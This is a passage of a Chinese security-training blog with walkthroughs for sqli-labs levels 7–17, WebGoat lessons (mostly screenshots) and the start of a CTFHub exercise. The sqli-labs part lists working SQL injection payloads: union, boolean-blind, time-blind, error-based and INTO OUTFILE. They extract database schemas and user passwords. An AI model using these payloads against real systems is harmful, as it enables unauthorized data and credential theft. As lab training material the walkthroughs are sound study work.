<h4 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a><strong>Less-7</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)) --+</span><br><span class="line">?id=1&#x27;)) order by 3 --+</span><br><span class="line"></span><br><span class="line">SELECT column1 FROM table_name INTO OUTFILE &#x27;file_path&#x27;</span><br><span class="line">OUTFILE命令可以将查询结果导出为文本文件,CSV文件等多种格式。</span><br><span class="line">注意：使用这个功能需要提前开启权限。你可以前往MySQL的源文件目录中，</span><br><span class="line">	打开my.ini配置文件，并修改其中的`secure_file_priv=&#x27;D://&#x27;`</span><br><span class="line">	参数设置为你的安全目录。(请设置为C盘以外的磁盘，避免系统权限问题。)</span><br><span class="line">	修改完成并重启后在MySQL命令行中输入`show variables like &#x27;%secure%&#x27;;`查看是否设置成功。</span><br><span class="line"></span><br><span class="line">?id=1&#x27;)) union select database(),version(),user() from dual into outfile &quot;d:\\project\\sqli-labs-master\\Less-7\\1.txt&quot; --+ </span><br><span class="line"></span><br><span class="line">执行完后，访问地址：</span><br><span class="line">http://192.168.120.139:30003/Less-7/1.txt</span><br></pre></td></tr></table></figure>

<h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a><strong>Less-8</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">布尔盲注</span><br><span class="line">database()	  显示数据库名称</span><br><span class="line">left(a,b)	  从左侧截取a的前b位</span><br><span class="line">substr(a,b,c) 从b位置开始，截取字符串a的c长度</span><br><span class="line">mid(a,b,c)    从位置b开始，截取a字符串的c位</span><br><span class="line">length()      返回字符串的长度</span><br><span class="line">Ascii()       将某个字符转换为ascii值</span><br><span class="line">char()        将ASCII码转换为对应的字符</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查数据库版本</span><br><span class="line">?id=1&#x27; and left(version(),1)=5 %23</span><br><span class="line">猜解数据库的长度</span><br><span class="line">?id=1&#x27; and length(database())=8 %23</span><br><span class="line">猜数据库名字</span><br><span class="line">?id=1&#x27;and left(database(),1)&gt;&#x27;a&#x27;--+</span><br><span class="line">?id=1&#x27;and left(database(),2)&gt;&#x27;sa&#x27;--+</span><br><span class="line">?id=1&#x27; and ascii(substr((database()),1,1)) &gt;80--+</span><br><span class="line">猜解表名</span><br><span class="line">?id=1&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit x,1),y)=&quot;&quot;--+</span><br><span class="line">猜解字段名</span><br><span class="line">?id=1&#x27; and left((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit x,1),y)=&quot;&quot;--+</span><br><span class="line">猜用户名</span><br><span class="line">?id=1&#x27; and left((select username from users limit x,1),y)=&quot;&quot;--+</span><br><span class="line">猜密码</span><br><span class="line">?id=1&#x27; and left((select password from users limit x,1),y)=&quot;&quot;--+</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/Cancerking/hacker-tools/tree/main/python/local/range/sqli-lab/Less-8.py">【实操脚本地址 Less-8.py】</a></p>
<h4 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a><strong>Less-9</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本关是基于时间的盲注</span><br><span class="line">1、sleep(5)：延时5秒</span><br><span class="line">2、if(a,b,c)：a为条件，正确返回b，否则返回c</span><br><span class="line">   如果正确5秒后返回，错误则立即返回</span><br><span class="line"></span><br><span class="line">?id=1&#x27; and if(1=1,sleep(5),1)--+</span><br><span class="line">判断参数构造。</span><br><span class="line">?id=1&#x27;and if(length((select database()))&gt;9,sleep(5),1)--+</span><br><span class="line">判断数据库名长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span><br><span class="line">逐一判断数据库字符</span><br><span class="line">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">判断所有表名长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断表名</span><br><span class="line">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名。</span><br><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容。</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/Cancerking/hacker-tools/tree/main/python/local/range/sqli-lab/Less-9.py">【实操脚本地址 Less-9.py】</a></p>
<h4 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a><strong>Less-10</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本关和第九关一样，只需要将单引号换成双引号。同样是基于时间的盲注</span><br><span class="line">1、sleep(5)：延时5秒</span><br><span class="line">2、if(a,b,c)：a为条件，正确返回b，否则返回c</span><br><span class="line">   如果正确5秒后返回，错误则立即返回</span><br><span class="line"></span><br><span class="line">?id=1&quot; and if(1=1,sleep(5),1)--+</span><br><span class="line">判断参数构造。</span><br><span class="line">?id=1&quot;and if(length((select database()))&gt;9,sleep(5),1)--+</span><br><span class="line">判断数据库名长度</span><br><span class="line">?id=1&quot;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span><br><span class="line">逐一判断数据库字符</span><br><span class="line">?id=1&quot;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">判断所有表名长度</span><br><span class="line">?id=1&quot;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断表名</span><br><span class="line">?id=1&quot;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?id=1&quot;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名。</span><br><span class="line">?id=1&quot; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?id=1&quot; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容。</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/Cancerking/hacker-tools/tree/main/python/local/range/sqli-lab/Less-10.py">【实操脚本地址 Less-10.py】</a></p>
<h4 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a><strong>Less-11</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尝试使用万能登录  </span><br><span class="line">uname=1&#x27; or 1=1#</span><br><span class="line"></span><br><span class="line">uname=1&#x27; or &#x27;1&#x27;=&#x27;1&amp;passwd=1&#x27; union select 1,2#&amp;submit=Submit</span><br><span class="line">uname=1&#x27; or &#x27;1&#x27;=&#x27;1&amp;passwd=1&#x27; union select database(),user()#&amp;submit=Submit</span><br><span class="line">uname=1&#x27; or &#x27;1&#x27;=&#x27;1&amp;passwd=1&#x27; union select (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),2#&amp;submit=Submit</span><br><span class="line">uname=1&#x27; or &#x27;1&#x27;=&#x27;1&amp;passwd=1&#x27;union select (select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27;and table_name=&#x27;users&#x27;),2#&amp;submit=Submit</span><br><span class="line">uname=1&#x27; or &#x27;1&#x27;=&#x27;1&amp;passwd=1&#x27;union select group_concat(username),group_concat(password) from security.users#&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<h4 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a><strong>Less-12</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=admin&#x27;&amp;passwd=admin&amp;submit=Submit #页面不报错</span><br><span class="line">uname=admin&quot;&amp;passwd=admin&amp;submit=Submit #页面有错误显示</span><br><span class="line"></span><br><span class="line">uname=a&quot;) union select 1,database()# &amp;passwd=admin&amp;submit=Submit</span><br><span class="line">uname=a&quot;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)# &amp;passwd=admin&amp;submit=Submit</span><br><span class="line">uname=a&quot;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)# &amp;passwd=admin&amp;submit=Submit</span><br><span class="line">uname=a&quot;) union select 1,(select group_concat(username,password) from security.users)# &amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>

<h4 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a><strong>Less-13</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) union select 1,2 #</span><br><span class="line"></span><br><span class="line">0x7e是~的意思，用concat拼接我们的sql语句，不符合xml文档的格式，就会报错</span><br><span class="line">1&#x27;)and updatexml(1,concat(0x7e,(select database())),3)#</span><br><span class="line">1&#x27;)and extractvalue(1,concat(0x7e,(select database())))#</span><br><span class="line">最大只能显示32个字符，所以要配合limit进行使用，每次只能显示一个表名，limt0,1,limt1,1,limit2,1...</span><br><span class="line">1&#x27;)and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))#</span><br><span class="line"> 爆列 </span><br><span class="line">1&#x27;)and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() limit 0,1)))#</span><br><span class="line">爆用户名密码 </span><br><span class="line">1&#x27;)and extractvalue(1,concat(0x7e,(select username from users limit 0,1)))#</span><br><span class="line">1&#x27;)and updatexml(1,concat(0x7e,(select username from users limit 0,1)),3)#</span><br></pre></td></tr></table></figure>

<h4 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a><strong>Less-14</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=admin&#x27;&amp;passwd=111&amp;submit=submit 回显正常</span><br><span class="line">uname=admin&quot;&amp;passwd=111&amp;submit=submit 回显报错</span><br><span class="line">uname=admin&quot;#&amp;passwd=111&amp;submit=submit 回显正常</span><br><span class="line"></span><br><span class="line">uname=admin&quot; order by 3#&amp;passwd=111&amp;submit=submit</span><br><span class="line">uname=admin&quot; order by 2#&amp;passwd=111&amp;submit=submit</span><br><span class="line">uname=admin&quot; union select 1,2#&amp;passwd=111&amp;submit=submit</span><br><span class="line"></span><br><span class="line">查表</span><br><span class="line">uname=admin&quot; union select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand()*2))a from information_schema.tables group by a#&amp;passwd=111&amp;submit=submit</span><br><span class="line">查列</span><br><span class="line">uname=admin&quot; union select count(*),concat((select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),floor(rand()*2))a from information_schema.tables group by a#&amp;passwd=111&amp;submit=submit</span><br><span class="line">查数据</span><br><span class="line">uname=admin&quot; union select count(*),concat((select username from users limit 0,1),floor(rand()*2))a from information_schema.tables group by a#&amp;passwd=111&amp;submit=submit</span><br></pre></td></tr></table></figure>

<h4 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a><strong>Less-15</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname=1&#x27; or 1=1#&amp;passwd=111&amp;submit=submit   successfully</span><br><span class="line">uname=1&#x27; or 1=2#&amp;passwd=111&amp;submit=submit    failed 说明是单引号闭合。</span><br><span class="line"></span><br><span class="line">猜数据库长度</span><br><span class="line">uname=1&#x27; or length(database())&gt;7#&amp;passwd=111&amp;submit=submit</span><br><span class="line">猜数据库名字</span><br><span class="line">uname=1&#x27; or ascii(substr(database(),1,1))&gt;114#&amp;passwd=111&amp;submit=submit</span><br><span class="line">猜数据库名字</span><br><span class="line">uname=1&#x27; or ascii(substr(database(),1,1))&gt;114#&amp;passwd=111&amp;submit=submit</span><br><span class="line">猜表名长度</span><br><span class="line">uname=1&#x27; or length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5#&amp;passwd=111&amp;submit=submit</span><br><span class="line">猜表名名字</span><br><span class="line">uname=1&#x27; or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))&gt;116#&amp;passwd=111&amp;submit=submit</span><br><span class="line">猜列名长度</span><br><span class="line">uname=1&#x27; or (length((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;limit 0,1)))&gt;1#&amp;passwd=111&amp;submit=submit</span><br><span class="line">猜列名名字</span><br><span class="line">uname=1&#x27; or ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit 1,1),1,1))&gt;116#&amp;passwd=111&amp;submit=submit</span><br><span class="line">猜数据长度</span><br><span class="line">uname=1&#x27; or length((select password from users limit 0,1))&gt;3#&amp;passwd=111&amp;submit=submit</span><br><span class="line">猜数据名字</span><br><span class="line">uname=1&#x27; or ascii(substr((select password from users limit 0,1),1,1))&gt;67#&amp;submit=submit</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/Cancerking/hacker-tools/tree/main/python/local/range/sqli-lab/Less-15.py">【实操脚本地址 Less-15.py】</a></p>
<h4 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a><strong>Less-16</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">时间盲注</span><br><span class="line">uname=admin&#x27; and sleep(5)#&amp;passwd=admin&amp;submit=Submit #快速反应</span><br><span class="line">uname=admin&quot; and sleep(5)#&amp;passwd=admin&amp;submit=Submit #快速反应</span><br><span class="line">uname=admin&quot;) and sleep(5)#&amp;passwd=admin&amp;submit=Submit #页面休眠5秒</span><br><span class="line">判断这里闭合方式为&quot;)，并且为字符型注入</span><br><span class="line"></span><br><span class="line">查看当前数据库长度</span><br><span class="line">uname=admin&quot;) and if(length(database())=8,sleep(5),1)#&amp;passwd=1&amp;submit=Submit</span><br><span class="line">查库名</span><br><span class="line">uname=admin&quot;) and if(left(database(),1)=&#x27;s&#x27;,sleep(5),1)#&amp;passwd=1&amp;submit=Submit</span><br><span class="line">查表名</span><br><span class="line">uname=admin&quot;) and if((select count(table_name) from information_schema.tables where table_schema=database())=4,sleep(5),1) #&amp;passwd=1&amp;submit=Submit</span><br><span class="line">查列名</span><br><span class="line">uname=admin&quot;) and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name= &#x27;emails&#x27;)=2,sleep(5),1) #&amp;passwd=1&amp;submit=Submit </span><br><span class="line">查数据</span><br><span class="line">uname=admin&quot;) and if((select ascii(substring(column_name, 1, 1)) from information_schema.columns where table_name = &#x27;emails&#x27; limit 0,1)判断表达式, sleep(5), 1) #&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/Cancerking/hacker-tools/tree/main/python/local/range/sqli-lab/Less-16.py">【实操脚本地址 Less-16.py】</a></p>
<h4 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a><strong>Less-17</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># updatexml() 报错注入</span><br><span class="line">uname=admin&amp;passwd=&#x27; OR updatexml(1,concat(&quot;!&quot;,version()),2)#&amp;submit=Submit</span><br><span class="line"></span><br><span class="line">获取数据库信息</span><br><span class="line">uname=admin&amp;passwd=&#x27; OR updatexml(1,concat(&quot;!&quot;,database()),2)#&amp;submit=Submit</span><br><span class="line">uname=admin&amp;passwd=&#x27; OR updatexml(1,concat(&quot;!&quot;,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = &#x27;security&#x27;)),2)#&amp;submit=Submit</span><br><span class="line">uname=admin&amp;passwd=&#x27; OR updatexml(1,concat(&quot;!&quot;,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = &#x27;security&#x27; AND table_name = &#x27;users&#x27;)),2)#&amp;submit=Submit</span><br><span class="line">uname=admin&amp;passwd=&#x27; OR (updatexml(1,concat(&#x27;!&#x27;,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1)),1))#submit=submit</span><br><span class="line">uname=admin&amp;passwd=&#x27; OR (updatexml(1,concat(&#x27;!&#x27;,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 1,1)),1))#submit=submit</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>本地靶场</category>
      </categories>
      <tags>
        <tag>靶场通关秘籍</tag>
      </tags>
  </entry>
  <entry>
    <title>本地靶场 - webgoat通关秘籍</title>
    <url>/cnblogs.github.io/2025/01/05/hacker/local/range/webgoat/webgoat%E9%80%9A%E5%85%B3%E7%A7%98%E7%B1%8D/</url>
    <content><![CDATA[<h3 id="General"><a href="#General" class="headerlink" title="General"></a><strong>General</strong></h3><h4 id="HTTP-Basics"><a href="#HTTP-Basics" class="headerlink" title="HTTP Basics"></a><strong>HTTP Basics</strong></h4><h5 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a><strong>第二题</strong></h5><p><img src="https://s2.loli.net/2025/01/05/qZrLHy9OVpRX1KU.png"><br><img src="https://s2.loli.net/2025/01/05/cRjEqoKMUODPfFL.png"><br><img src="https://s2.loli.net/2025/01/05/yXhSjrdTcNxf5F6.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：fzheng</span><br></pre></td></tr></table></figure>
<h5 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a><strong>第三题</strong></h5><p><img src="https://s2.loli.net/2025/01/05/agcojkKuLtqnIZR.png"><br><img src="https://s2.loli.net/2025/01/05/pq7uzC5VAOglkev.png"><br><img src="https://s2.loli.net/2025/01/05/XNZqAYvudfIGs1e.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用burpsuit抓包 修改magicnum参数=27</span><br></pre></td></tr></table></figure>
<h4 id="HTTP-Proxies"><a href="#HTTP-Proxies" class="headerlink" title="HTTP Proxies"></a><strong>HTTP Proxies</strong></h4><h5 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a><strong>第六题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/ZanYXFobJ1q8dmk.png"><br><img src="https://s2.loli.net/2025/01/12/3PChtO4KURcXrFJ.png"><br><img src="https://s2.loli.net/2025/01/12/C1orGDkVf8K72BW.png"><br><img src="https://s2.loli.net/2025/01/12/VD48qH1zSXrWOeY.png"><br><img src="https://s2.loli.net/2025/01/12/7D4r2pzCcOBQwXH.png"></p>
<h4 id="Developer-Tools"><a href="#Developer-Tools" class="headerlink" title="Developer Tools"></a><strong>Developer Tools</strong></h4><h5 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a><strong>第四题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/oSYcxnuZ38ydWbG.png"></p>
<h5 id="第六题-1"><a href="#第六题-1" class="headerlink" title="第六题"></a><strong>第六题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/h6AcPSmOwkG3IpT.png"></p>
<h4 id="Crypto-Basics"><a href="#Crypto-Basics" class="headerlink" title="Crypto Basics"></a><strong>Crypto Basics</strong></h4><h5 id="第二题-1"><a href="#第二题-1" class="headerlink" title="第二题"></a><strong>第二题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/IlPrYy8ihAgHQ6m.png"><br><img src="https://s2.loli.net/2025/01/12/p5tMTbOLwilacIZ.png"><br><img src="https://s2.loli.net/2025/01/12/lXPgZ3Qhp1D5Ouo.png"></p>
<h5 id="第三题-1"><a href="#第三题-1" class="headerlink" title="第三题"></a><strong>第三题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/1w7fQ9lINFHcUxo.png"><br><img src="https://s2.loli.net/2025/01/12/bAngzxHpoLVmSXW.png"><br><img src="https://s2.loli.net/2025/01/12/cKn9d5eBfY31TPz.png"></p>
<h5 id="第四题-1"><a href="#第四题-1" class="headerlink" title="第四题"></a><strong>第四题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/WApaYRUiDkTm7Zn.png"><br><img src="https://s2.loli.net/2025/01/12/J2t8vgAmeBG9Z4n.png"><br><img src="https://s2.loli.net/2025/01/12/fGiTBd3Jxb827rY.png"><br><img src="https://s2.loli.net/2025/01/12/UC8FMio4J2QPHq5.png"></p>
<h5 id="第六题-2"><a href="#第六题-2" class="headerlink" title="第六题"></a><strong>第六题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/zUSBqDhQAIdVHfs.png"><br><img src="https://s2.loli.net/2025/01/12/BL9QPzJoZSe3hTs.png"><br><img src="https://s2.loli.net/2025/01/12/M9sBCrHVUZ6oYjm.png"><br><img src="https://s2.loli.net/2025/01/12/8nPNOAJYX3qdLlZ.png"><br><img src="https://s2.loli.net/2025/01/12/IUrRtNqzxSwZH2M.png"><br><img src="https://s2.loli.net/2025/01/12/EgcNj24WCIoDVz5.png"></p>
<h5 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a><strong>第八题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/cIZHb89V2m6LRuF.png"><br><img src="https://s2.loli.net/2025/01/12/tTUZaHSWpo1yMCB.png"><br><img src="https://s2.loli.net/2025/01/12/IjJsMkSZfuntxbQ.png"><br><img src="https://s2.loli.net/2025/01/12/sXU8WKyPAvHBeF7.png"></p>
<h4 id="Writing-new-lesson"><a href="#Writing-new-lesson" class="headerlink" title="Writing new lesson"></a><strong>Writing new lesson</strong></h4><h5 id="第六题-3"><a href="#第六题-3" class="headerlink" title="第六题"></a><strong>第六题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/kpbc2v4eJqF6gNW.png"><br><img src="https://s2.loli.net/2025/01/12/8W4Rh7p6zxtKZcr.png"></p>
<h3 id="A1-Injection"><a href="#A1-Injection" class="headerlink" title="(A1) Injection"></a><strong>(A1) Injection</strong></h3><h4 id="SQL-Injection-intro"><a href="#SQL-Injection-intro" class="headerlink" title="SQL Injection (intro)"></a><strong>SQL Injection (intro)</strong></h4><h5 id="第二题-2"><a href="#第二题-2" class="headerlink" title="第二题"></a><strong>第二题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/hvGKs76z9Bl2RHj.png"></p>
<h5 id="第三题-2"><a href="#第三题-2" class="headerlink" title="第三题"></a><strong>第三题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/T2byeqKsmEwZC7X.png"></p>
<h5 id="第四题-2"><a href="#第四题-2" class="headerlink" title="第四题"></a><strong>第四题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/tpxzVDZejcvuKoC.png"></p>
<h5 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a><strong>第五题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/YOBfaq23v8npyVu.png"></p>
<h5 id="第九题"><a href="#第九题" class="headerlink" title="第九题"></a><strong>第九题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/GHsamEAYQXthn3w.png"></p>
<h5 id="第十题"><a href="#第十题" class="headerlink" title="第十题"></a><strong>第十题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/shDvAq4ZBgpR67d.png"></p>
<h5 id="第十一题"><a href="#第十一题" class="headerlink" title="第十一题"></a><strong>第十一题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/aE9cpQUmBxwrT6C.png"></p>
<h5 id="第十二题"><a href="#第十二题" class="headerlink" title="第十二题"></a><strong>第十二题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/8rvmANgYiMP3Tco.png"></p>
<h5 id="第十三题"><a href="#第十三题" class="headerlink" title="第十三题"></a><strong>第十三题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/p3P7KkDGQq4zgdj.png"></p>
<h4 id="SQL-Injection-advanced"><a href="#SQL-Injection-advanced" class="headerlink" title="SQL Injection (advanced)"></a><strong>SQL Injection (advanced)</strong></h4><h5 id="第三题-3"><a href="#第三题-3" class="headerlink" title="第三题"></a><strong>第三题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/XEmkbDn5SVlKQRr.png"></p>
<h5 id="第五题-1"><a href="#第五题-1" class="headerlink" title="第五题"></a><strong>第五题</strong></h5><p><img src="https://s2.loli.net/2025/01/12/759Pxfdgqlb8yGF.png"><br><a href="https://github.com/Cancerking/hacker-tools/blob/main/python/local/range/wetgoat/(A1)%20Injection%20-%20SQL%20Injection%20(advanced)_5.py">脚本地址</a></p>
<h4 id="SQL-Injection-mitigation"><a href="#SQL-Injection-mitigation" class="headerlink" title="SQL Injection (mitigation)"></a><strong>SQL Injection (mitigation)</strong></h4><h5 id="第五题-2"><a href="#第五题-2" class="headerlink" title="第五题"></a><strong>第五题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/tnrCx2mpXQ3Kib1.png"></p>
<h5 id="第六题-4"><a href="#第六题-4" class="headerlink" title="第六题"></a><strong>第六题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/tNmBcuO74ov5y8k.png"></p>
<h5 id="第九题-1"><a href="#第九题-1" class="headerlink" title="第九题"></a><strong>第九题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/OdgHmDPqpJvMClW.png"></p>
<h5 id="第十题-1"><a href="#第十题-1" class="headerlink" title="第十题"></a><strong>第十题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/zmY9Tqe713wOiDk.png"></p>
<h5 id="第十二题-1"><a href="#第十二题-1" class="headerlink" title="第十二题"></a><strong>第十二题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/oVn9Fe6BRy3msOu.png"><br><img src="https://s2.loli.net/2025/01/14/SZexDlGJkcmE4VA.png"><br><img src="https://s2.loli.net/2025/01/14/UF7IPBSEujKGAbn.png"><br><img src="https://s2.loli.net/2025/01/14/6LqBuZjJT5YHdgt.png"></p>
<h4 id="Path-traversal"><a href="#Path-traversal" class="headerlink" title="Path traversal"></a><strong>Path traversal</strong></h4><h5 id="第二题-3"><a href="#第二题-3" class="headerlink" title="第二题"></a><strong>第二题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/h5Z3CDNfsFlW8Tm.png"></p>
<h5 id="第三题-4"><a href="#第三题-4" class="headerlink" title="第三题"></a><strong>第三题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/xsMgRocq23vSYOd.png"></p>
<h5 id="第四题-3"><a href="#第四题-3" class="headerlink" title="第四题"></a><strong>第四题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/icVbesTF8SDQvBH.png"><br><img src="https://s2.loli.net/2025/01/14/brZScJBvuqIlXNV.png"></p>
<h5 id="第五题-3"><a href="#第五题-3" class="headerlink" title="第五题"></a><strong>第五题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/MqYBXUK8bQ7LFoh.png"><br><img src="https://s2.loli.net/2025/01/14/av4YxRUnmIXZiFb.png"></p>
<h5 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a><strong>第七题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/bGNw6q2LXQIm1JC.png"></p>
<h3 id="A2-Broken-Authentication"><a href="#A2-Broken-Authentication" class="headerlink" title="(A2) Broken Authentication"></a><strong>(A2) Broken Authentication</strong></h3><h4 id="Authentication-Bypasses"><a href="#Authentication-Bypasses" class="headerlink" title="Authentication Bypasses"></a><strong>Authentication Bypasses</strong></h4><h5 id="第二题-4"><a href="#第二题-4" class="headerlink" title="第二题"></a><strong>第二题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/lBGfgJq9EeXyiAI.png"><br><img src="https://s2.loli.net/2025/01/14/iceXM5Qlx2VqyHt.png"></p>
<h4 id="JWT-tokens"><a href="#JWT-tokens" class="headerlink" title="JWT tokens"></a><strong>JWT tokens</strong></h4><h5 id="第三题-5"><a href="#第三题-5" class="headerlink" title="第三题"></a><strong>第三题</strong></h5><p><img src="https://s2.loli.net/2025/01/14/JFjClN72tuYQeAb.png"><br><img src="https://s2.loli.net/2025/01/14/y67Nw5ulqkpfYAZ.png"></p>
]]></content>
      <categories>
        <category>本地靶场</category>
      </categories>
      <tags>
        <tag>靶场通关秘籍</tag>
      </tags>
  </entry>
  <entry>
    <title>网络靶场 - CTFHub</title>
    <url>/cnblogs.github.io/2025/01/05/hacker/online/range/CTFHub/CTFHub/</url>
    <content><![CDATA[<h2 id="技能树"><a href="#技能树" class="headerlink" title="技能树"></a><strong>技能树</strong></h2><h3 id="WEB前置技能"><a href="#WEB前置技能" class="headerlink" title="WEB前置技能"></a><strong>WEB前置技能</strong></h3><h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a><strong>HTTP协议</strong></h4><h5 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a><strong>请求方式</strong></h5><p><img src="https://s2.loli.net/2025/01/05/Y8liGIxr27pvLJU.png"><br><img src="https://s2.loli.net/2025/01/05/WvBCPqD8R3r5j74.png"><br>得到提示，如果请求方法为CTFHUB，那么会得到flag<br>使用burp抓包进行修改GET为CTFHUB,得到flag<br><img src="https://s2.loli.net/2025/01/05/Tdtj9kuelKUaCRp.png"></p>
